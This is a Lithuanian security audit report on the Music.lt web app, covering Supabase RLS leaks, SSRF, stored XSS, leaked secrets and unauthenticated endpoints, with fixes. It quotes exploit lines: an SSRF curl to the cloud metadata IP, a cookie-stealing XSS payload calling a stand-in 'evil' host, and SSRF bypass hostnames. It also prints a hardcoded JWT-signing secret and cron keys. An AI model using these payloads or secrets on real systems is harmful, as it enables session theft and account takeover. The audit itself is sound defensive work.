# Music.lt — Security Audit (2026-07-06)

Gilus 5-krypčių auditas visam kodui (auth/authorization, cron/internal endpointai, injection/service_role/RLS, SSRF/XSS/upload, headers/rate-limit/CORS). Repo `edvardassmulaitis/musiclt`, `main` → Vercel → `musiclt.vercel.app`. 338 API route'ai.

> **Svarbu (konteksto pastaba):** nutekėję raktai handoff dokumente (GitHub PAT, Supabase service_role, cron raktai) yra žinomas, sąmoningas kompromisas dėl greičio kūrimo etape ir čia nelaikomi „radiniu" — juos reikės rotuoti prieš live. Ši ataskaita telkiasi į **kodo pažeidžiamumus**, kurių handoff'e nebuvo.

---

## TL;DR — svarbiausia

Trys aktyviai išnaudojami pažeidžiamumai gyvame site'e **prieinami be jokios autentikacijos**:

1. **`/api/debug` grąžina `NEXTAUTH_SECRET` plain-textu** → bet kas gali suklastoti `super_admin` sesiją. Patikrinta rankiniu būdu — tikra.
2. **`/api/fetch-image` — SSRF su turinio nuskaitymu** → serveris parsiunčia bet kokį URL (cloud metadata `169.254.169.254`, vidiniai IP) ir grąžina turinį atgal. `redirect:'follow'`, be host allowlist'o.
3. **`/api/artists/import` — neautentikuotas service_role rašymas** → masinis DB teršimas.

Prie jų — kelios High rizikos: stored XSS (bloge/komentaruose/diskusijose, projekte apskritai nėra HTML sanitizerio), neautentikuoti **Opus** AI endpointai (tiesioginė sąskaitos ataka), hardcoded cron raktai repo+URL, jokių security headerių (clickjacking admin puslapiuose), ir magic-link „email bomb".

**Ką agentai patikrino ir rado TVARKINGA** (kad nekeltumėte nerimo be reikalo): impersonacija (tik tikras super_admin gali), rolių eskalacija per profilio update (blokuota — `role` ne `allowed` sąraše), IDOR komentaruose/bloge/skelbimuose/studijoje (owner check yra), magic-link tokenas (256-bit, single-use, expiry), `/api/internal/*` ir dauguma `/api/cron/*` (Bearer secret iš env). OAuth/JWT rolė serverio pusėje, neklastojama iš kliento.

---

## 🔴 C0 — PATVIRTINTA GYVAI: visi privatūs pokalbiai skaitomi viešu anon raktu

**Tai svarbiausias radinys ir jis patvirtintas prieš gyvą DB** (per Supabase Management API, 2026-07-06).

`chat_messages`, `chat_participants`, `chat_conversations`, `chat_reactions` turi RLS **įjungtą**, bet SELECT politika yra `USING (true)` — t. y. leidžia visiems, įskaitant `anon` rolę. O `anon` raktas (`NEXT_PUBLIC_SUPABASE_ANON_KEY`) siunčiamas į kiekvieną naršyklę.

**Įrodymas (realiai įvykdyta):**
```
GET https://tyvribkcymenlvnrwkdz.supabase.co/rest/v1/chat_messages?select=*
Header: apikey: <viešas anon raktas>
→ content-range: 0-0/16   (16 privačių žinučių, su skaitomu `body` lauku)
GET .../rest/v1/chat_participants  → 8 įrašai (kas su kuo bendrauja)
```
Bet kas internete gali nuskaityti **visų vartotojų privačias žinutes** ir pokalbių dalyvius. Kūrėjai `lib/chat-realtime.ts:13-16` patys dokumentavo (klaidingą) grėsmės modelį — „saugumas remiasi tuo, kad conversation ID nežinomas" — bet `USING(true)` visai nereikalauja ID.

**Kodėl negalima taisyti vienu SQL:** realtime klientas (`lib/chat-realtime.ts`) naudoja **gryną anon raktą be user JWT** (`persistSession:false`, `setAuth` nekviečiamas). Todėl `auth.uid()` ten yra NULL. Jei tiesiog pakeisim politiką į „tik dalyviai" (`auth.uid()`), **realtime pokalbiai nustos veikti**. Reikia koordinuoto taisymo:
1. SQL: pakeisti chat lentelių SELECT politikas į dalyvių-scope (`EXISTS (select 1 from chat_participants p where p.conversation_id = chat_messages.conversation_id and p.user_id = auth.uid())`), ARBA `REVOKE SELECT ... FROM anon` ir varyti realtime tik per autentikuotus token'us.
2. Kodas: `lib/chat-realtime.ts` — perduoti prisijungusio vartotojo access token'ą (`client.realtime.setAuth(token)` / autentikuotas klientas), kad `auth.uid()` veiktų.

**Nedariau DB pakeitimo be jūsų sutikimo** (galėtų sulaužyti gyvą chat'ą). Tai #1 prioritetas — paruošiu SQL + `chat-realtime.ts` pataisą, kai patvirtinsit.

**Papildomai patikrinta gyvai (nuraminti):** `profiles` RLS **įjungtas** (agento baimė nepasitvirtino), o emailai NEnuteka — bonus'as: `profiles` politikoje yra *rekursijos bug'as* (`42P17 infinite recursion`), dėl kurio anon užklausos krenta (netyčinė apsauga, bet vertėtų sutvarkyti politiką). `likes` lentelė — RLS išjungtas (žema rizika, bet įtraukti į RLS peržiūrą).

---

## 🔴 C-1 — PATVIRTINTA GYVAI (MAX re-scan): `verification_tokens` skaitomi/rašomi anon raktu → account takeover

Pakartotinis auditas rado dar vieną kritinį, ne mažiau rimtą už chat: **magic-link login token'ų lentelė `verification_tokens`** turėjo politiką `service_role_all` su `roles={public}`, `qual=true`, `with_check=true`. Viešu anon raktu buvo galima:
- **NUSKAITYTI** token'us (identifier=email + token + expires) → prisijungti kaip bet kuris vartotojas (per 24h galiojimo langą). Patvirtinta: nuskaitytas realus token'as.
- **ĮTERPTI** suklastotą token'ą bet kokiam el. paštui → tiesioginis account takeover admin paskyrai.

**Sutvarkyta gyvai** (`20260706b`): `alter policy ... using(false) with check(false)` + `revoke all from anon, authenticated`. Patikrinta: anon → `permission denied`; service_role veikia.

## 🔴 C-2 — Anon raktu galimi tiesioginiai rašymai (tampering) + jautrūs skaitymai

Pilnas gyvo DB RLS sweep'as parodė, kad chat/verification_tokens nebuvo vieninteliai:
- **Anon INSERT** politikos (`with_check=true`, roles `{public}`) daugybėje lentelių: `top_votes`/`top_suggestions` (balsų klastojimas apeinant API), `boombox_completions` (žaidimo rezultatų pūtimas), `shoutbox_messages` (spam), `activity_events`, `artist_members`, `search_clicks`.
- **61 lentelė su RLS IŠJUNGTU** — dalis skaitomos anon raktu su realiais duomenimis: `track_plays` (kas ką klausė — privatumas), `nav_settings`, `artist_team`, `music_import_jobs`, `home_snapshot`.

**Sutvarkyta gyvai** (`20260706c`): kadangi klientas per anon raktą NErašo (patikrinta — anon naudojamas tik chat/notifications realtime), atšaukti **visi** `insert/update/delete` iš `anon`+`authenticated` visose public lentelėse (uždaryta visa tampering klasė vienu ėjimu) + atšauktas SELECT nuo jautrių/vidinių lentelių. Vieši skaitymai (artists/tracks/news) nepaliesti — patikrinta.

## MAX re-scan — bypass'ų medžioklė mano paties pataisymuose

Adversarialūs agentai bandė pralaužti naujas apsaugas. Rasta ir **iškart sutaisyta**:
- **SSRF DNS bypass** — mano host-only guard'as praleisdavo `169.254.169.254.nip.io` (viešas DNS→private IP) ir NAT64 IPv6 formas (`[64:ff9b::a9fe:a9fe]`) bei trailing-dot (`localhost.`). Perrašyta: dabar resolve'inam DNS ir validuojam kiekvieną IP + tikras IPv6 baitų parsinimas. Unit-tested (visi bypass'ai blokuojami, teisėti host'ai praeina).
- **XFF spoofing** — IP rate-limit'ai ir balsavimo IP dedup buvo apeinami keičiant kairįjį `X-Forwarded-For`. Pataisyta: `x-real-ip` (Vercel-patikimas) / dešinysis XFF. Pritaikyta rate-limit + `voting/vote`, `top/vote`, `dienos-daina/votes`, `radar/submit`, `missing-reports`.
- **`top/cron` fail-open** — `Bearer undefined` praeidavo, jei `CRON_SECRET` tuščias → `authorizeCron`.
- **`search/youtube` + `search/spotify`** neautentikuoti kvotos degintojai → 20/min/IP.

Agentai **patvirtino SOLID** (jokių bypass'ų): DOMPurify sanitizeris (18 payload'ų — visi neutralizuoti), `cron-auth` (constant-time, fail-closed), Turnstile, secret'ų pašalinimas (0 hardcoded literalų), fetch-image/upload patikrų vieta. Taip pat patvirtino, kad **NĖRA**: neautentikuotų service_role rašymų (visi vieši telemetry/likes/votes yra sąmoningi + input-validated), mass-assignment, IDOR, kitų debug endpoint'ų, env nutekėjimo.

---

## Sisteminė problema (stiprina viską žemiau)

**100% autorizacijos gyvena aplikacijos kode.** Kiekviena DB užklausa naudoja `createAdminClient()` (Supabase **service_role**, kuris apeina RLS). Nėra duomenų bazės lygio apsaugos „atsarginio tinklo" — jei route'as pamiršta patikrą, tai reiškia visiškai neautentikuotą priėjimą prie service-role DB. Middleware saugo **tik** `/api/admin/*` ir `/admin/*`; visi kiti 300+ route'ų turi autentikuotis patys. Kelios to nedaro.

---

## CRITICAL

### C1 — `/api/debug` (+ `/api/debug-search`) atskleidžia paslaptis be auth
`app/api/debug/route.ts` — `GET` grąžina `{ NEXTAUTH_SECRET, GOOGLE_CLIENT_ID, NEXTAUTH_URL }`. Middleware šio route'o nesaugo.
**Exploit:** `curl https://musiclt.vercel.app/api/debug` → gauni JWT pasirašymo raktą → su `next-auth/jwt encode({role:'super_admin'}, secret)` suklastoji sesijos slapuką → pilnas admin perėmimas. `/api/debug-search` papildomai eikvoja YouTube kvotą ir „numeta" upstream HTML.
**Fix:** Ištrinti abu route'us. Rotuoti `NEXTAUTH_SECRET` ir Google OAuth secret (laikyti sudegusiais).
**Statusas:** ✅ Ištrinta šioje šakoje.

### C2 — Hardcoded `NEXTAUTH_SECRET` fallback kode (naujas radinys)
`middleware.ts:5`, `lib/auth.ts:237`, `app/api/auth/magic-link/verify/route.ts:77`:
```js
process.env.NEXTAUTH_SECRET || 'kjcxLaUePrIgs0SM6C6yen/Whkp87MDKywsUjmrBPYE='
```
Tas pats literalas ir **pasirašo** (magic-link/verify), ir **tikrina** (middleware) JWT. Jei env kintamasis kada nors nenustatytas (preview deploy, naujas environment, praleistas kintamasis) — pasirašymo raktas tampa vieša konstanta git istorijoje → bet kas mint'ina super_admin tokeną be login.
Papildomai silpni fallback'ai: `lib/email.ts:19` (`... || 'musiclt'`), `lib/zaidimai.ts:60` (`... || 'zaidimai-dev'`).
**Fix:** Pašalinti literalus, fail closed (`throw`, jei nenustatyta). Rotuoti reikšmę.
**Statusas:** ✅ Sutvarkyta šioje šakoje (fail-closed).

### C3 — `/api/fetch-image` — neautentikuotas SSRF su turinio exfiltracija
`app/api/fetch-image/route.ts` — `POST {url, returnDataUrl}`, be session patikros, be host allowlist'o, `redirect:'follow'`. Su `returnDataUrl:true` grąžina base64 turinį (read primitive); kitu atveju įkelia į viešą `covers` bucket (anon storage abuse).
**Exploit:**
```bash
curl -X POST https://musiclt.vercel.app/api/fetch-image \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/","returnDataUrl":true}'
```
**Fix:** Reikalauti editor+ sesijos; tik `https`; resolve'inti DNS ir blokuoti private/link-local/loopback IP; `redirect:'error'` arba validuoti kiekvieną hop; `returnDataUrl` tik `image/*`.
**Statusas:** ✅ Sutvarkyta šioje šakoje (auth + IP guard + no-redirect).

### C4 — `/api/artists/import` — neautentikuotas service_role rašymas
`app/api/artists/import/route.ts` — visas handleris be `getServerSession`/token/key patikros. Kuria atlikėjų įrašus, importuoja Wikipedia diskografijas per service_role. Komentaras sako „Cowork automation", bet cowork rakto patikra dingusi (gretimi `/api/cowork/*` route'ai TURI `validateCoworkApiKey`).
**Fix:** Pridėti `validateCoworkApiKey(req)` arba `requireFullAdmin()`.
**Statusas:** ✅ Sutvarkyta šioje šakoje (cowork key / admin).

---

## HIGH

### H1 — Stored XSS: blogas, komentarai, diskusijos
Projekte **nėra jokio HTML sanitizerio** (nėra DOMPurify/sanitize-html priklausomybės). User HTML renderinamas per `dangerouslySetInnerHTML`:
- **Blogas:** rašymas `app/api/blog/posts/route.ts:83` (`content` verbatim), render `app/blogas/[username]/[slug]/post-content.tsx:39` + homepage `app/HomeClient.tsx:966,981` (`topas_meta`). „Valikliai" (`cleanLegacyBlogHtml`) NĖRA sanitizeriai — nešalina `<script>`/`onerror`.
- **Komentarai:** `app/api/comments/route.ts:202` (raw), render `components/EntityCommentsBlock.tsx:1202` (`tagLinksNofollow` net išsaugo `onerror`).
- **Diskusijos:** `app/api/diskusijos/route.ts:112` (raw), render `app/diskusijos/[slug]/page.tsx:310`.

**Exploit:** prisijungęs user'is paskelbia turinį `<img src=x onerror="fetch('//evil/c?'+document.cookie)">` → vykdoma visiems lankytojams (įskaitant adminus, viešuose puslapiuose).
**Fix:** Vienas bendras serverio pusės sanitizeris (`isomorphic-dompurify` arba `sanitize-html`) taikomas rašant į blog/comments/diskusijas + gynybiškai prieš render. **Reikia naujos priklausomybės — Fazė 2.**

### H2 — Neautentikuoti AI endpointai = tiesioginė sąskaitos ataka
- `app/api/generate-description/route.ts` — be auth, **Opus** (`claude-opus-4-5`), iki 3000 simbolių įvesties. Patikrinta rankiniu būdu.
- `app/api/tracks/[id]/ai-interpretation/route.ts` — be auth, Anthropic + **rašo** `ai_interpretation`/`ai_image_url` į bet kurį track'ą (cost burn + turinio mutacija).
- `app/api/translate/route.ts` — be auth, Haiku.
**Fix:** Reikalauti editor+ sesijos + per-IP rate limit (kaip `app/api/anthropic/route.ts`, kuris jau turi rolės patikrą).
**Statusas:** ✅ Sesijos patikra pridėta šioje šakoje; rate limit — Fazė 2.

### H3 — Hardcoded cron raktai repo + `vercel.json` + URL query
`app/api/cron/feed-candidates` (`fcand_7a91c3`), `fantasy-savaite` (`fliga_9d2c41`), `refresh-home` (`hsnap_7f3a9c2e8b1d4f6a`). Visi trys — ir kode, ir `vercel.json` path'e (t. y. Vercel access log'uose / referrer'iuose).
- `refresh-home` FALLBACK_KEY OR'inamas su `CRON_SECRET` → **nerotuojamas backdoor** be deploy.
- `fantasy-savaite?key=...&week=` — `week` nevaliduojamas → galima perrašyti/suklastoti bet kurios savaitės rezultatus.
- `feed-candidates` → neautentikuota homepage moderacijos mutacija (`status→approved`).
**Fix:** Pašalinti hardcoded konstantas; reikalauti tik `Authorization: Bearer $CRON_SECRET` (Vercel įdeda automatiškai); išimti raktus iš `vercel.json` path'ų; validuoti `week` regex'u; jei reikia rankinio rakto — iš env + `crypto.timingSafeEqual`.
**Statusas:** ✅ Sutvarkyta šioje šakoje (CRON_SECRET-only + week validacija).

### H4 — Nėra jokių security headerių (clickjacking, no CSP, no HSTS)
`next.config.js` neturi `headers()`. Trūksta: CSP, HSTS, X-Frame-Options/frame-ancestors, X-Content-Type-Options, Referrer-Policy, Permissions-Policy. `X-Powered-By: Next.js` atskleidžiamas.
**Rizika:** clickjacking ant `/auth/*` ir `/admin/*` (įskaitant super_admin impersonacijos UI); jokio CSP → bet koks stored-XSS gali laisvai exfiltruoti sesiją; nėra HSTS.
**Fix:** `headers()` blokas + `poweredByHeader:false`. CSP iš pradžių `Report-Only` (app renderina embed'us/YouTube/Spotify), tada įjungti.
**Statusas:** ✅ Headeriai pridėti; CSP paleistas kaip `Report-Only` (saugu), kad nesulaužytų embed'ų.

### H5 — Magic-link „email bomb" / Resend reputacijos abuse
`app/api/auth/magic-link/route.ts` — vienintelis throttle yra `new Map()` atmintyje su 30s cooldown. Serverless: kiekviena instance turi savo Map → lengvai apeinama lygiagrečiais kvietimais; nėra per-IP limito.
**Rizika:** bombarduoti auką laiškais / flood'inti bet kokius adresus per jūsų Resend → kredito eikvojimas + siuntėjo domeno reputacijos sunaikinimas.
**Fix:** Bendras store (DB/Redis) rate limit pagal email IR IP; sutrumpinti tokeno TTL 24h→~15min. **Reikia store — Fazė 2.**

### H6 — Middleware authz „fails open" į editor
`lib/admin-sections.ts` — `minRoleForPath` grąžina `admin` tik rankiniam `ADMIN_ONLY_PREFIXES` sąrašui; **visi kiti `/api/admin/*` default'ina į `editor`**. Pamirštas įtraukti sensityvus route'as → pasiekiamas editor'iaus (pvz. `/api/admin/nav-settings`, `/api/admin/reitingai`).
**Fix:** Apversti default'ą į fail-closed (`admin`, nebent route eksplicitiškai pažymėtas editor-safe). **Reikia peržiūrėti editor-safe sąrašą — Fazė 2** (kad nesulaužytų editor workflow).

---

## MEDIUM

- **PostgREST `.or()` filter injection** search endpointuose: `app/api/artists/route.ts:67`, `app/api/search-master/route.ts:172`, `lib/chat.ts:610`, `lib/skelbimai.ts:296`. User `q` interpoliuojamas į filtrą; `,` `.` `(` `)` gali įterpti papildomas sąlygas (ne arbitrary SQL, bet tos pačios lentelės scope manipuliacija). `app/api/comments/route.ts` — SAUGU (`coerceEntityId`).
- **`/api/search-master` DoS amplifikatorius**: be auth, ~20 užklausų (su `count:'exact'`) per request, RLS-bypass, CDN cache tik `s-maxage=15` (apeinama keičiant `q`). ~4.8s/užklausa → DB išsekimas.
- **Verbose klaidos**: ~40+ route'ų grąžina raw `error.message` (Supabase/Postgres lentelių/stulpelių pavadinimai) klientui. Fix: bendras `jsonError()` helper.
- **Authenticated SSRF `/api/upload`**: `fetch(url)` be IP block (blind, reikia login).
- **SVG upload stored XSS**: `lib/image-resize.ts` praleidžia `image/svg+xml` nepaliestą į viešą bucket → `<script>` SVG viduje vykdomas atidarius storage URL (`*.supabase.co` origin).
- **Nėra rate limit UGC rašymui** (komentarai, blog, diskusijos, discoveries, forum). Rate limit yra tik: magic-link, shoutbox, radar/submit, top/vote, voting/vote.
- **Non-constant-time secret palyginimas** (`===`) visuose machine endpointuose.

---

## Rekomenduojama eiga

**Fazė 1 — kritiniai hotfixai (paruošta šioje šakoje, be naujų priklausomybių, be infra):**
C1 debug ištrynimas · C2 fail-closed secret · C3 fetch-image SSRF guard · C4 + H2 auth ant AI/import endpointų · H3 cron raktai → CRON_SECRET · H4 security headeriai (CSP Report-Only) · SVG atmetimas · generic error helper.

**Fazė 2 — reikia sprendimų / priklausomybių / infra:**
- **HTML sanitizeris** (H1) — `isomorphic-dompurify`, taikomas write+render. Reikia patikrinti, kad nesulaužytų esamų blog postų.
- **Rate limiting store** (H5, M) — Upstash Redis (rekomenduoju, serverless-native) arba Supabase lentelė. Taikyti magic-link, search, AI, UGC.
- **Bot prevention / CAPTCHA** — Cloudflare Turnstile (nemokamas, privatumą gerbiantis) ant magic-link/registracijos/komentarų; įjungiamas per env flag (galima įjungti/išjungti pagal poreikį).
- **DDoS / WAF** — Cloudflare proxy prieš Vercel arba Vercel Firewall (Attack Challenge Mode). Reikia sprendimo dėl DNS.
- **H6** middleware fail-closed — reikia suderinti editor-safe route sąrašą.
- **Paslapčių rotacija** prieš live + saugus Cowork veikimo modelis.

**Fazė 3 — gilesnis sutvirtinimas:**
RLS politikų įvedimas (kad DB būtų atsarginis authz sluoksnis vietoj 100% app-level), PostgREST `.or()` injection parametrizavimas, per-route authz decorator vietoj middleware prefix sąrašo.
